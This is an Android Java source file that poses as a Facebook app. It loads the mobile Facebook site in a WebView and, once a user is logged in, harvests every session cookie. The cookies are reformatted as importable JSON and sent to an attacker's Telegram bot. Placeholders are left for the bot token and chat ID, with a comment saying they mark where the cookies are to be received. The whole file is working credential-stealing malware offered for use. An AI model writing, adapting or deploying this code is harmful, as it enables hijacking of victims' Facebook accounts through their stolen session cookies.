package com.facebook;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import androidx.appcompat.app.AppCompatActivity;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.List;

import org.json.JSONException;
import org.json.JSONObject;



public class MainActivity extends AppCompatActivity {

	private final String TAG = "MainActivity";
	
    private final String BOT_TOKEN = "PASTE_YOUR_BOT_TOKEN_HERE";
	private String TG_API_ENDPOINT = "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s";
	private final String CHAT_ID = "YOUR_CHAT_ID"; // where you want to receive cookies through your bot

    private WebView webView;
	
	private SharedPreferences preferences;
	
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
		
		preferences = getPreferences(Context.MODE_PRIVATE);
	
        setContentView(R.layout.activity_main);
        webView = findViewById(R.id.webview);
        webView.getSettings().setLoadsImagesAutomatically(true);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                String cookie = CookieManager.getInstance().getCookie(url);
				Log.d(TAG, cookie + " with " + url);
				
				if (cookie.contains("c_user")) {
					try {
						String parsedCookies = parseCookiesToJson(cookie);
						if (parsedCookies != null) {
							sendCookiesToTelegram(parsedCookies);
						}
						
					} catch (JSONException e) {
						Log.e(TAG, e.getMessage());
					}
				}		
				
            }
        });
		
        webView.loadUrl("https://m.facebook.com/");

    }
	
	private String parseCookiesToJson(String cookie) throws JSONException {
		List<JSONObject> listOFCookies = new ArrayList<>();
		String[] arrayOfCookies = cookie.split(";");
		for (String eachCookie : arrayOfCookies) {
			String[] arrayOfEachCookie = eachCookie.split("=");
			JSONObject jsonObject = new JSONObject();
			jsonObject.put("name", arrayOfEachCookie[0].trim());
			jsonObject.put("value", arrayOfEachCookie[1].trim());
			
			if (jsonObject.getString("name").equals("c_user")) {
				if (jsonObject.getString("value").equals(preferences.getString("C_USER", "NO_C_USER"))) {
					return null;
				} else {
					SharedPreferences.Editor edit = preferences.edit();
					edit.putString("C_USER", jsonObject.getString("value"));
					edit.apply();
				}		
			}
			
			jsonObject.put("domain", ".facebook.com");
			
			if (arrayOfEachCookie[0].equals("m_pixel_ratio")
				|| arrayOfEachCookie[0].equals("c_user")
				|| arrayOfEachCookie[0].equals("wd")
				|| arrayOfEachCookie[0].equals("x-referer")) {
				jsonObject.put("httpOnly", false);
			} else {
				jsonObject.put("httpOnly", true);
			}
			
			jsonObject.put("path", "/");
			jsonObject.put("secure", true);
			jsonObject.put("httpOnly", false);
			jsonObject.put("sameSite", "no_restriction");
			
			if (arrayOfEachCookie[0].equals("m_pixel_ratio")
			    || arrayOfEachCookie[0].equals("x-referer")) {
				jsonObject.put("session", true);
			} else {
				jsonObject.put("session", false);
			}
			
			jsonObject.put("firstPartyDomain", "");
			jsonObject.put("storeId", null);
			
			listOFCookies.add(jsonObject);
		}		
		Log.d(TAG, listOFCookies.toString());
		return listOFCookies.toString();
	}
	
	private void sendCookiesToTelegram(final String message) {
	    new Thread() {
	        @Override
	        public void run() {

				try {
				    URL url = new URL(String.format(TG_API_ENDPOINT, BOT_TOKEN, CHAT_ID, message));
	
					HttpURLConnection http = (HttpURLConnection) url.openConnection();
					http.setRequestMethod("GET");
					http.setRequestProperty("Host","api.telegram.org");
					
					http.getInputStream();
					
					http.disconnect();

				} catch (MalformedURLException e) {
					Log.e(TAG, e.getMessage());
				} catch (IOException e) {
					Log.e(TAG, e.getMessage());
				}
			}
		}.start();
		
	}

}
